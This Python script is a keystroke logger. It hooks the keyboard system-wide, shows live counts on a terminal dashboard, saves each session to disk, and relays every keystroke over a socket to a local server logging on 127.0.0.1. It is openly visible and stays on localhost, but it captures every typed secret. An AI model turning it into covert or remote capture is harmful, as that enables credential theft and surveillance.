#!/usr/bin/env python3
import os
import time
import threading
import socket
from datetime import datetime
from pynput import keyboard
from colorama import init, Fore, Style

init(autoreset=True)

HOST = '127.0.0.1'
PORT = 65432

def start_server():
    def server_loop():
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind((HOST, PORT))
            s.listen()
            while True:
                conn, addr = s.accept()
                with conn:
                    data = conn.recv(4096)
                    if data:
                        with open("server_log.txt", "a") as f:
                            f.write(f"{datetime.now()}: {data.decode('utf-8')}\n")
    thread = threading.Thread(target=server_loop, daemon=True)
    thread.start()
    return thread

def send_keystroke(key_text):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((HOST, PORT))
            s.sendall(key_text.encode('utf-8'))
    except ConnectionRefusedError:
        pass

def create_session_folder():
    folder_name = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    os.makedirs(folder_name, exist_ok=True)
    return folder_name

def save_session(folder_name, keystrokes, stats):
    with open(os.path.join(folder_name, "keystrokes.txt"), "w") as f:
        for i, k in enumerate(keystrokes, 1):
            f.write(f"{i}: {k}\n")
    with open(os.path.join(folder_name, "stats.txt"), "w") as f:
        for k, v in stats.items():
            f.write(f"{k}: {v}\n")
    print(Fore.GREEN + f"[save] session saved to {folder_name}")

def display_dashboard(stats):
    max_bar_width = 50
    total = max(stats.get('total', 1), 1)
    def bar(count):
        length = int((count / total) * max_bar_width) if total else 0
        return '=' * length
    print("\033c", end="")  # clear terminal
    print(Fore.YELLOW + Style.BRIGHT + "=== Live Keystroke Dashboard (Esc ends session, Ctrl+C exits program) ===\n")
    print(Fore.CYAN + f"Session total: {stats['total']}\n")
    print(Fore.GREEN + f"Letters:      {stats['letters']:>4} | {bar(stats['letters'])}")
    print(Fore.BLUE + f"Numbers:      {stats['numbers']:>4} | {bar(stats['numbers'])}")
    print(Fore.MAGENTA + f"Special Keys: {stats['special_keys']:>4} | {bar(stats['special_keys'])}")
    print(Fore.RED + f"Other Chars:  {stats['other_chars']:>4} | {bar(stats['other_chars'])}")

def run_single_session():
    keystrokes = []
    stats = {'letters':0, 'numbers':0, 'special_keys':0, 'other_chars':0, 'total':0}
    session_folder = create_session_folder()
    print(Fore.YELLOW + f"[session] started. Logs will be saved in: {session_folder}")
    display_dashboard(stats)

    def on_press(key):
        try:
            char = key.char
            keystrokes.append(char)
            if char.isalpha():
                stats['letters'] += 1
            elif char.isdigit():
                stats['numbers'] += 1
            else:
                stats['other_chars'] += 1
            send_keystroke(char)
        except AttributeError:
            if key == keyboard.Key.esc:
                print(Fore.YELLOW + "[session] Esc pressed — ending session.")
                return False
            key_text = str(key)
            keystrokes.append(key_text)
            stats['special_keys'] += 1
            send_keystroke(key_text)

        stats['total'] += 1
        display_dashboard(stats)

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

    save_session(session_folder, keystrokes, stats)
    return session_folder, keystrokes, stats

def main_loop():
    start_server()
    print(Fore.GREEN + "[main] local server started in background (writing to server_log.txt).")
    try:
        while True:
            run_single_session()
            print(Fore.YELLOW + "[main] session finished. Starting a new session in 2 seconds...")
            time.sleep(2)
    except KeyboardInterrupt:
        print(Fore.RED + "\n[main] KeyboardInterrupt received: exiting gracefully.")

if __name__ == "__main__":
    main_loop()
